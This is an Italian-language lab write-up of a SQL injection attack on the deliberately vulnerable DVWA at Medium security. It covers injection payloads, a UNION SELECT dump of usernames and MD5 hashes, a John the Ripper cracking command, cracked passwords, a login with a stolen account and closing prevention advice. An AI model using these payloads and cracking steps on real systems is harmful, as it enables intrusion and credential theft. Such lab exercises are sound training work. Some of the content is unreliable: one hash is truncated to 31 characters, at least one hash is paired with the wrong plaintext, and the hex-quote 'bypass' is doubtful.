# SQL Injection Exploit su DVWA (Livello di Sicurezza Medium)

## Panoramica
Questo progetto documenta il processo di sfruttamento di una vulnerabilità **SQL Injection** nella **Damn Vulnerable Web Application (DVWA)** al livello di sicurezza **Medium**. L'obiettivo era estrarre dati sensibili, inclusi le credenziali degli utenti, e dimostrare come decodificare gli hash delle password.

## Obiettivi
1. Sfruttare la vulnerabilità SQL Injection.
2. Estrarre le credenziali degli utenti dal database.
3. Decodificare gli hash delle password per ottenere le password in chiaro.
4. Utilizzare le credenziali decodificate per accedere all'applicazione web.

---

## Configurazione dell'Ambiente
### Configurazione del Laboratorio:
- **Host DVWA:** 192.168.13.150 (Metasploitable)
- **Host Kali Linux:** 192.168.13.100
- **Livello di Sicurezza:** Medium

### Prerequisiti:
1. DVWA in esecuzione su Metasploitable.
2. Sezione SQL Injection attivata.
3. Credenziali di accesso a DVWA:
   - **Username:** admin  
   - **Password:** password

---

## Passaggi dell'Exploit

### 1. Identificazione della Vulnerabilità
- Accedi alla sezione SQL Injection di DVWA.
- Testa con payload semplici come:
  ```sql
  1'
  ```
- Si è osservato che a livello Medium alcuni caratteri vengono sanitizzati.

### 2. Aggirare i Filtri con la Codifica Esadecimale
- Utilizza un payload in formato esadecimale per bypassare la sanitizzazione degli input:
  ```sql
  0x27 OR 1=1 --
  ```
- Risultati:
  Dati utente estratti dal database.

### 3. Estrazione di Dati Sensibili
- Usato SQL Injection per enumerare il database:
  - Elenco di utenti e hash delle password:
    ```sql
    0x27 UNION SELECT user, password FROM users --
    ```
  - Risultati:
    | Username  | Hash Password                             |
    |-----------|------------------------------------------|
    | admin     | 5f4dcc3b5aa765d61d8327deb882cf99         |
    | gordonb   | e99a18c428cb38d5f260853678922e03         |
    | 1337      | 8d3533d75ae2c396d7e0d4fcc69216b         |
    | pablo     | 0d107d09f5bbe40cade3de5c71e9e9b7         |
    | smithy    | 5f4dcc3b5aa765d61d8327deb882cf99         |

### 4. Decodifica degli Hash delle Password
- Salvati gli hash in un file `hashes.txt`.
- Utilizzato **John the Ripper** per decodificare gli hash:
  ```bash
  john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
  ```
- Risultati:
  | Hash                                     | Password Decodificata |
  |------------------------------------------|-----------------------|
  | 5f4dcc3b5aa765d61d8327deb882cf99         | password              |
  | e99a18c428cb38d5f260853678922e03         | 123456                |
  | 8d3533d75ae2c396d7e0d4fcc69216b         | abc123                |
  | 0d107d09f5bbe40cade3de5c71e9e9b7         | letmein               |

### 5. Utilizzo delle Credenziali per Accedere
- Effettuato il login con **pablo** utilizzando la password **letmein**.

---

## Conclusione
- La vulnerabilità SQL Injection ha permesso di estrarre dati sensibili al livello Medium.
- Gli hash delle password sono stati decodificati, rivelando password in chiaro e consentendo l'accesso agli account utente.

### Punti Chiave
- **Codifica esadecimale** efficace per aggirare la sanitizzazione degli input.
- Gli hash delle password sono vulnerabili a attacchi basati su dizionari se si utilizzano algoritmi deboli come MD5.

### Raccomandazioni per la Prevenzione
1. Utilizzare **query parametrizzate** per prevenire SQL Injection.
2. Adottare **algoritmi di hashing robusti** (es. bcrypt, Argon2).
3. Applicare **validazione degli input** su tutti i dati forniti dall'utente.
4. Limitare i privilegi del database per ridurre l'impatto di eventuali attacchi.

---
